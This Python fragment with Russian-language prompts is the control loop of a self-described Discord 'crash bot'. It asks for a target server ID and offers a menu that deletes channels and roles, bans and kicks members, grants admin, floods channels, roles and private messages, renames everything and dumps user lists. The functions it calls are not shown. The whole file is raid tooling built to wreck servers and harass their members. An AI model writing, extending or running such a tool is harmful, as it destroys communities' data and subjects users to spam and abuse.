            response = Write.Input(f">> Вы хотите крашнуть ID сервер {self.server_name} - {self.server_id}, верно? [Y/N]: ", Colors.red_to_blue, interval=0)
            if response.lower() == 'y':
                pass
            else:
                Write.Print(">> Введите ID Сервера которого хотите крашнуть: ", Colors.red_to_blue, interval=0)
                self.server_id = int(Write.Input(">> ", Colors.red_to_blue, interval=0))
                self.server_name = await self.get_server_name(self.server_id)
                with open('configs/setup.json', 'r') as f:
                    setup = json.load(f)
                setup['SERVER'] = {'id': self.server_id, 'name': self.server_name}
                with open('configs/setup.json', 'w') as f:
                    json.dump(setup, f, indent=4)
        else:
            Write.Print(">> Введите ID Сервера которого хотите крашнуть: ", Colors.red_to_blue, interval=0)
            self.server_id = int(Write.Input(">> ", Colors.red_to_blue, interval=0))
            self.server_name = await self.get_server_name(self.server_id)
            with open('configs/setup.json', 'r') as f:
                setup = json.load(f)
            setup['SERVER'] = {'id': self.server_id, 'name': self.server_name}
            with open('configs/setup.json', 'w') as f:
                json.dump(setup, f, indent=4)

        global exception_ids
        base_exceptions = [
            self.bot_id,
            self.user_id
        ]
        choice = Write.Input(f"\n>> Y - Загрузить, N - Базовые\n>> Вы хотите загрузить исключения из файла или оставить базовые? [Y/N]: ", Colors.red_to_blue, interval=0)
        if choice.lower() == 'y':
            if os.path.exists("configs/exceptions.json"):
                with open("configs/exceptions.json", "r") as f:
                    exception_ids = json.load(f)
            else:
                Write.Print(">> Файл configs/exceptions.json не найден, используем базовые.\n", Colors.red_to_blue, interval=0)
                exception_ids = base_exceptions
        else:
            exception_ids = base_exceptions

        os.system("cls")
        Write.Print(logo, Colors.red_to_blue, interval=0)
        Write.Print(Center.XCenter(Box.DoubleCube(menu)), Colors.red_to_blue, interval=0)

        while True:
            command = int(Write.Input("\n>> Введите номер функции >> ", Colors.red_to_blue, interval=0))
            if command == 1:
                await delete_channels(self.bot)
            elif command == 2:
                await ban_users(self.bot)
            elif command == 3:
                await kick_users(self.bot)
            elif command == 4:
                await full_admin(self.bot)
            elif command == 5:
                await delete_roles(self.bot)
            elif command == 6:
                await delete_all(self.bot)
            elif command == 7:
                await spam_channels(self.bot)
            elif command == 8:
                await spam_channel(self.bot)
            elif command == 9:
                await flood_category(self.bot)
            elif command == 10:
                await flood_channels(self.bot)
            elif command == 11:
                await flood_roles(self.bot)
            elif command == 12:
                await flood_rename_server(self.bot)
            elif command == 13:
                await flood_pm(self.bot)
            elif command == 14:
                await flood_mass_pm(self.bot)
            elif command == 15:
                await rename_all_users(self.bot)
            elif command == 16:
                await rename_all_channels(self.bot)
            elif command == 17:
                await rename_all_roles(self.bot)
            elif command == 18:
                await rename_server(self.bot)
            elif command == 19:
                await refactor_server_icon(self.bot)
            elif command == 20:
                await give_random_roles(self.bot)
            elif command == 21:
                user_id_input = int(Write.Input("\n>> Введите ID пользователя, которого хотите добавить в исключения: ", Colors.red_to_blue, interval=0))
                await add_exception(user_id_input)
            elif command == 22:
                await change_activity(self.bot)
            elif command == 23:
                await dump_users(self.bot)
            elif command == 24:
                await change_config(self.bot)
            elif command == 666:
                exit(0)
            elif command == 777:
                Write.Print("\nЭто краш-бот для дискорда.\nЧтобы закинуть бота, нужно создать бота, закинуть токен, ваш id, бот id и id сервера в софт", Colors.red_to_blue, interval=0)
                Write.Input("\n>> Ok >> ", Colors.red_to_blue, interval=0)
            else:
                Write.Print("\nНеверная команда", Colors.red_to_blue, interval=0)
            Write.Input("\n>> Нажмите Enter для продолжения >> ", Colors.red_to_blue, interval=0)
            os.system("cls")
            Write.Print(logo, Colors.red_to_blue, interval=0)
            Write.Print(Center.XCenter(Box.DoubleCube(menu)), Colors.red_to_blue, interval=0)


soft = Soft(user_id, bot_id, TOKEN, bot)
# kek
async def main():
    bot_task = asyncio.create_task(bot.start(TOKEN))
    await bot.is_ready_event.wait()
    
    await soft.run()
    await bot_task

if __name__ == "__main__":
    bot.run(TOKEN)